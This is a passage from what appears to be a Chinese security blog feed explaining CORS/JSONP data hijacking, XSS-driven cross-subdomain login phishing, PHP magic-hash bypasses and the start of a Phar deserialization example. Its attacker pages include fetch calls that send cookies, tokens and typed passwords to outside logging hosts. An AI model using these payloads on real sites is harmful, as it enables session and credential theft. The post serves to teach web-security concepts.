(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.$_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;)&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请求失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        fetch(<span class="string">&#x27;//a.x.com/cors.php&#x27;</span>, &#123;</span><br><span class="line">            credentials: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.text();</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">datas</span>) </span>&#123;</span><br><span class="line">            fetch(<span class="string">&#x27;//WebLog/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: JSON.stringify(datas)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_ac.png"></p><ul><li><p>Chromium从Ver.80开始Cookies的SameSite默认为Lax，即会默认拦截跨域Cookie（感谢phithon师傅的强势指导），Firefox 68.6可以复现</p></li><li><p>可通过<code>Set-Cookie: SameSite=None; Secure</code>响应头显式地允许通过HTTPS传输跨域Cookie</p></li></ul><h2 id="攻击思路二"><a href="#攻击思路二" class="headerlink" title="攻击思路二"></a>攻击思路二</h2><p>当JSONP的动态处理页未设置<code>Content-Type</code>响应头时其默认为<code>text/html</code>，可能会导致反射XSS：<code>?callback=xss&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>将JSONP的动态处理页<code>Content-Type</code>响应头设置为<code>application/json</code>便可以防御反射XSS，但仍可能存在JSONP数据劫持</p><p>在讲JSONP数据劫持之前，先了解一下曾出现过的JSON数据劫持。假设<code>json.x.com</code>在校验登录成功后，会向客户端返回<code>account</code>之类的数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;account&quot;</span>: <span class="string">&quot;admin@x.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;...&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取其之前的JSON数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">&quot;account&quot;</span>,&#123;</span></span><br><span class="line"><span class="javascript">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;json.x.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码通过重写Object类的set方法实现了对<code>account</code>属性的hook，目前该漏洞已被修复，可以通过本地测试来管中窥豹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">&quot;Id&quot;</span>, &#123;</span><br><span class="line">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        alert(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样怼属性可以</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.Id = <span class="number">666</span>;</span><br><span class="line"><span class="comment">// 这个JSON就不行了</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;<span class="string">&quot;Id&quot;</span>:<span class="number">250</span>&#125;;</span><br></pre></td></tr></table></figure><p>看完了被修复的JSON劫持，再来看看目前依然存在的JSONP劫持。假设<code>a.x.com/index.php</code>负责校验身份并调用数据接口，<code>a.x.com/json.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="comment">// 与上例相同</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/json.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;&#125;)&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;获取失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hackfun</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> datas = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> key in obj) &#123;</span><br><span class="line">                <span class="keyword">var</span> tmp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                tmp = key+<span class="string">&#x27;:&#x27;</span>+obj[key]+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                datas += tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            fetch(<span class="string">&#x27;//68943a75.y7z.xyz/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: document.cookie</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;http://a.x.com/json.php?callback=hackfun&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_ab.png"></p><h2 id="攻击思路三（误）"><a href="#攻击思路三（误）" class="headerlink" title="攻击思路三（误）"></a>攻击思路三（误）</h2><p>假设<code>a.x.com</code>与<code>x.com</code>相互信任，利用<code>b.x.com</code>的XSS钓取a登录处的帐号密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- a.x.com/login.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>悲催的A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 100px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//baidu.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;account&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&quot;x.com&quot;</span>;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- b.x.com --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>有XSS的B<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//a.x.com/login.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">100%</span> <span class="attr">frameborder</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&#x27;x.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ifrm = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            ifrm.document.getElementById(<span class="string">&#x27;submit&#x27;</span>).onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> account = ifrm.document.getElementById(<span class="string">&quot;account&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> passwd = ifrm.document.getElementById(<span class="string">&quot;passwd&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> url = <span class="string">&#x27;//WebLog/?account=&#x27;</span>+account+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;passwd=&#x27;</span>+passwd;</span></span><br><span class="line">                fetch(url, &#123;</span><br><span class="line"><span class="javascript">                    mode: <span class="string">&#x27;no-cors&#x27;</span></span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/tyclykyld_aa.png"></p><p>实战中XSS通常有限制，没机会插这么多代码进去，所以一般采用外联JS的方式引入，浏览器虽然会在控制台中报跨域错误并拦截响应，但通常仍可以正常发出请求并将敏感数据带至WebLog平台。抓包分析可以发现，虽然<code>&lt;iframe&gt;</code>放在了<code>&lt;script&gt;</code>前面，不过浏览器的请求顺序是：</p><ol start="0"><li><p>加载主页面</p></li><li><p>加载iframe<strong>标签</strong></p></li><li><p>加载外联JS</p></li><li><p>加载iframe<strong>内容</strong></p></li><li><p>用户按下<code>提交</code>按钮</p></li><li><p>执行劫持函数</p></li><li><p>表单提交</p></li></ol><p>这里说这么细是因为发现了一个有趣但蛋疼的问题，最初用作触发劫持函数的代码其实是用<code>document.getElementById(&#39;login&#39;).onsubmit</code>监测表单提交实现的，测试过程中一会可以一会嗝屁特别玄学，接着就开始了三天的对 浏览器、服务器、操作系统、网络地址、网络环境 一千多次的黑盒交叉测试（哭了），最终将影响因素锁定在表单提交后的新页面加载速度上。</p><p>因为如果 后者的加载速度 比 监测到表单提交并执行劫持函数 这一过程的速度要更快的话，新来的页面会将在内存中还未来得及执行完的劫持函数给刷掉。。。。。由于表单提交的默认监听事件是鼠标点击<code>提交</code>按钮（按下再松开），所以我将劫持函数的监听事件改为了检测鼠标按下，这样如果按下<code>提交</code>按钮后松得慢一点，就能产生一个让劫持函数执行完的时间缝隙Orz。。。。。当然如果点击的手速够快的话仙人可能也跳不到你</p><p>回过头看之前的实现方式，则是等用户点击<code>提交</code>按钮后，劫持函数 与 新页面加载 同时执行，拼的是 WebLog平台所在服务器 与 新页面所在服务器 的响应速度，不确定性就太多了。。。。。而改为 检测鼠标按下 后则在此基础上又开辟了 受害者点击 手速这个时间窗口23333</p><p>更新：经p师傅提醒，监听鼠标点击可能会错过通过<code>回车</code>或是<code>自动填充提交</code>方式提交的表单，所以为了保险可以两种方式同时使用</p><p>到此为止，有没有觉得哪里有点不对劲？如果目的是想利用<code>b.x.com</code>的XSS钓取a的帐号密码的话，为何不直接通过JS重写b的页面仿造成a登录处的样子并劫持表单输入呢？干嘛要用什么鬼跨域的逻辑绕来绕去（淦）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-origin policy</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">Using Fetch</a></p><p><a href="https://www.freebuf.com/articles/web/208672.html">浅谈跨域威胁与安全</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;何为同源&quot;&gt;&lt;a href=&quot;#何为同源&quot; class=&quot;headerlink&quot; title=&quot;何为同源&quot;&gt;&lt;/a&gt;何为同源&lt;/h2&gt;&lt;p&gt;如果两个URL的协议、域名、端口一致则满足同源，&lt;code&gt;http&lt;/code&gt;与&lt;code&gt;https&lt;/code&gt;、&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cors" scheme="https://hosch3n.github.io/tags/cors/"/>
    
    <category term="jsonp" scheme="https://hosch3n.github.io/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>PHP哈希函数</title>
    <link href="https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/"/>
    <id>https://hosch3n.github.io/2020/08/24/PHP%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/</id>
    <published>2020-08-24T03:39:24.000Z</published>
    <updated>2021-05-29T12:50:02.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0e"><a href="#0e" class="headerlink" title="0e"></a>0e</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&#x27;0e123&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;0e456&#x27;</span>;</span><br><span class="line">$a == $b;</span><br><span class="line">$a !== $b;</span><br><span class="line"></span><br><span class="line">md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) == md5(<span class="string">&#x27;240610708&#x27;</span>);</span><br><span class="line">md5(<span class="string">&#x27;s878926199a&#x27;</span>) == md5(<span class="string">&#x27;s155964671a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>) == sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>);</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;0e251288019&#x27;</span> == hash(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;0e251288019&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a = [<span class="number">0</span>];</span><br><span class="line">$b = [<span class="number">1</span>];</span><br><span class="line">$a != $b;</span><br><span class="line"></span><br><span class="line">md5($a) === md5($b);</span><br><span class="line"></span><br><span class="line">sha1($a) === sha1($b);</span><br><span class="line"></span><br><span class="line">hash(<span class="string">&#x27;md4&#x27;</span>, $a) == hash(<span class="string">&#x27;md4&#x27;</span>, $b);</span><br></pre></td></tr></table></figure><h2 id="‘or"><a href="#‘or" class="headerlink" title="‘or"></a>‘or</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stristr(md5(<span class="string">&#x27;ffifdyop&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br><span class="line">stristr(md5(<span class="string">&#x27;129581926211651571912466741651878684928&#x27;</span>, <span class="literal">true</span>), <span class="string">&quot;&#x27;or&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>浮点值运算存在精度问题，反序列化时会出现值不等但运算后哈希相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0e&quot;&gt;&lt;a href=&quot;#0e&quot; class=&quot;headerlink&quot; title=&quot;0e&quot;&gt;&lt;/a&gt;0e&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="hash" scheme="https://hosch3n.github.io/tags/hash/"/>
    
    <category term="md" scheme="https://hosch3n.github.io/tags/md/"/>
    
    <category term="sha" scheme="https://hosch3n.github.io/tags/sha/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://hosch3n.github.io/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-08-19T09:43:01.000Z</published>
    <updated>2020-10-14T08:08:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和<code>phar://</code>伪协议可以对phar文件进行读写等操作，如果 <code>phar.readonly</code> 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>根据<a href="https://www.php.net/manual/en/phar.fileformat.phar.php">官方文档</a>可知，Phar由 <code>stub</code>/<code>manifest</code>/<code>contents</code>/<code>signature</code> 四部分组成。</p><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p><code>stub</code> 用于标识phar文件类型，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>（xxx为任意内容）。因为无需以特定标识开头，所以可以结合其它文件头进行伪装：<code>GIF89a&lt;?php __HALT_COMPILER();?&gt;</code>。</p><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>该结构存放了一些phar文件的大小长度等属性，包括序列化格式的元数据。</p><h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p><code>contents</code> 存放压缩后的实际文件内容。</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>顾名思义该结构用于文件校验，可以是常见的哈希值或密钥签名。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>因为 <code>manifest</code> 中的 <code>Meta-data</code> 以序列化格式存储，那么读取时必然有反序列化的过程，如果该部分用户可控（如上传phar文件并引用），则存在反序列化漏洞。</p><ul><li><a href="https://github.com/php/php-src/commit/0c238ede019f6ffbe7c996ec1695a747f4bca966">PHP8.0</a> 改为了不自动反序列化 <code>Meta-data</code>，除非调用了 <code>getMetadata()</code></li></ul><h3 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ddmddw!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span 